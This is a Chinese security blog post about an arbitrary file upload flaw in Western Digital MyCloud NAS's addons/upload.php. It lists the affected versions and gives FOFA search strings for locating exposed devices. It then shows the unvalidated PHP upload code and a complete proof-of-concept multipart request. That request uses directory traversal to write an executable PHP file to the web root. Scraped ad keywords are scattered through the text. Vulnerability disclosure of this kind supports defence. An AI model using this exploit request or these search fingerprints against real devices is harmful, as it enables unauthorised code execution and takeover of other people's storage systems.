---
title: "西部数码 NAS addons/upload.php 任意文件上传漏洞"
source: https://mrxn.net/jswz/west-nas-addons-upload-rce.html
asset_dir: assets/西部数码-nas-addonsupload.php-任意文件上传漏洞
---

# 西部数码 NAS addons/upload.php 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/13 12:17
- 673浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

漏洞修复方案

服务器安全服务

SQL

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS addons/upload.php中存在[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者可通过该漏洞在服务器端任意[执行代码](https://mrxn.net/tag/rce)，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

JSON处理工具

授权

漏洞扫描器

直接看 `/addons/upload.php` 其业务实现逻辑如下

```
<?php
//if(!isset($_REQUEST['name'])) throw new Exception('Name required');
//if(!preg_match('/^[-a-z0-9_][-a-z0-9_.]*$/i', $_REQUEST['name'])) throw new Exception('Name error');
//
//if(!isset($_REQUEST['index'])) throw new Exception('Index required');
//if(!preg_match('/^[0-9]+$/', $_REQUEST['index'])) throw new Exception('Index error');
//
//if(!isset($_FILES['file'])) throw new Exception('Upload required');
//if($_FILES['file']['error'] != 0) throw new Exception('Upload error');

$path = str_replace('//','/',$_REQUEST['folder']);
$filename = str_replace('\\','',$_REQUEST['name']);
$target =  $path . $filename . '-' . $_REQUEST['index'];

//$target =  $_REQUEST['folder'] . $_REQUEST['name'] . '-' . $_REQUEST['index'];

move_uploaded_file($_FILES['file']['tmp_name'], $target);

//$handle = fopen("/tmp/debug.txt", "w+");
//fwrite($handle, $_FILES['file']['tmp_name']); 
//fwrite($handle, "\n"); 
//fwrite($handle, $target); 
//fclose($handle); 

// Might execute too quickly.
sleep(1);

?>
```

深入探索

技术文章订阅

安全认证考试

编程语言教程

三个参数均未过滤或校验直接参与文件上传保存文件路径操作，形成**目录遍历+任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞**，允许攻击者可控文件路径及内容。

# 漏洞复现

```
POST /web/addons/upload.php HTTP/1.1
Host: west.nas.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="folder"

/../../../../../../../../var/www/
------WebKitFormBoundary
Content-Disposition: form-data; name="name"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="index"

2.php
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary--
```

访问上传文件 `1-2.php`

[![西部数码 NAS addons/upload.php 任意文件上传漏洞](images/img-001-e29bdd8ad6ce.webp)](https://image.mrxn.net/d8bc444aecbb4fd58b1d140c48ec3240.webp)

成功[执行](https://mrxn.net/tag/rce)上传文件里的代码

漏洞修复方案

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
